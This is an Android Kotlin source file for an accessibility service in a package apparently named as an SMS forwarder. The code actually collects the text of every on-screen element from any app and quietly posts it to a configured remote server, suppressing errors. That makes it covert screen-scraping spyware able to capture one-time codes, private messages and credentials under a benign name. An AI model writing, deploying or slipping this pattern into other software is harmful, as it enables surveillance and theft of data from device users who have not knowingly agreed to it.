package com.example.smsforwarder.service
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.accessibilityservice.AccessibilityService
import com.example.smsforwarder.util.ConfigStore
import com.example.smsforwarder.net.ApiClient
class AccessibilitySmsService: AccessibilityService(){
  private lateinit var cfg:ConfigStore
  private lateinit var api:ApiClient
  override fun onServiceConnected(){ cfg=ConfigStore(this); api=ApiClient(cfg.getServer(),cfg.getToken()) }
  override fun onAccessibilityEvent(event: AccessibilityEvent){ val node=event.source?:return; val texts=mutableListOf<String>(); collect(node,texts); val content=texts.joinToString(" ").take(200); if(content.isNotEmpty()){ cfg.pushMessage("unknown",content); try{ api.postSms(cfg.getDeviceId(),cfg.getPhone(),"unknown",content,System.currentTimeMillis()/1000) }catch(e:Exception){} } }
  private fun collect(node: AccessibilityNodeInfo, out: MutableList<String>){ val t=node.text?.toString(); if(!t.isNullOrEmpty()) out.add(t); for(i in 0 until node.childCount){ val c=node.getChild(i)?:continue; collect(c,out) }
  }
  override fun onInterrupt(){}
}
